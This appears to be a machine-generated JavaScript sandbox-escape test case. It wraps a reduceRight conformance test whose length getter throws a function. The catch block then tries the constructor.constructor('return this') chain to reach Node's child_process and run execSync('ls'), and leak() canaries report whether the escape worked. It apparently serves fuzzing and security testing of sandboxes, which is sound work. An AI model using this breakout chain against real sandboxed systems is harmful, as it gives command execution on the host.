try {
    var accessed = false;
    var Con = function () {
        let REPLACER = 23;
    };
    function callbackfn(prevVal, curVal, idx, obj) {
        let REPLACER = 23;
        accessed = true;
        return obj.length === 2;
    }
    var proto = {};
    Object.defineProperty(proto, 'length', {
        get: function () {
            throw () => {
                return () => {
                };
            };
            return 2;
        },
        configurable: true
    });
    Con.prototype = proto;
    var child = new Con();
    child[0] = 12;
    child[1] = 11;
    child[2] = 9;
    assert(Array.prototype.reduceRight.call(child, callbackfn, 11), 'Array.prototype.reduceRight.call(child, callbackfn, 11) !== true');
    assert(accessed, 'accessed !== true');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}